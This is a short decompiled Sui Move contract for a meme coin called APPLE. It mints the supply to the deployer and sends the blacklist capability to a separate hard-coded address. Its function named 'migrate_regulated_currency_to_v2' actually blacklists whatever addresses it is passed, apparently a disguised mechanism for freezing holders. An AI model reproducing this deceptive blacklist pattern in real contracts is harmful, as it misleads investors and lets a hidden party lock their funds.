module 0x694b2c7c0660f8491a8a04f2625bd493d97e1c5806187a83b34d962d5f77c4be::APPLE {
    struct APPLE has drop {
        dummy_field: bool,
    }

    fun init(arg0: APPLE, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency<APPLE>(arg0, 2, b"APPLE", b"dog with apple in mouth", b"dog with apple in mouth", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe_from_bytes(b"https://arweave.net/rE1A4DQ2S-F7KTZlZpMoAYyvbWbRG7nwnhXrsMx8EqM?ext=png")), arg1);
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<APPLE>>(v2);
        0x2::transfer::public_transfer<0x2::coin::DenyCap<APPLE>>(v1, @0x7c3c58155b85c3ecf4864777fce255a7e405ffa3b6e443e736976588910f0e8d);
        let v3 = v0;
        0x2::coin::mint_and_transfer<APPLE>(&mut v3, 100000000000, 0x2::tx_context::sender(arg1), arg1);
        0x2::transfer::public_transfer<0x2::coin::TreasuryCap<APPLE>>(v3, 0x2::tx_context::sender(arg1));
    }

    entry fun migrate_regulated_currency_to_v2(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCap<APPLE>, arg2: vector<address>, arg3: &mut 0x2::tx_context::TxContext) {
        let v0 = 0;
        while (v0 < 0x1::vector::length<address>(&mut arg2)) {
            let v1 = 0x1::vector::pop_back<address>(&mut arg2);
            if (!0x2::coin::deny_list_contains<APPLE>(arg0, v1)) {
                0x2::coin::deny_list_add<APPLE>(arg0, arg1, v1, arg3);
            };
            v0 = v0 + 1;
        };
    }

    // decompiled from Move bytecode v6
}

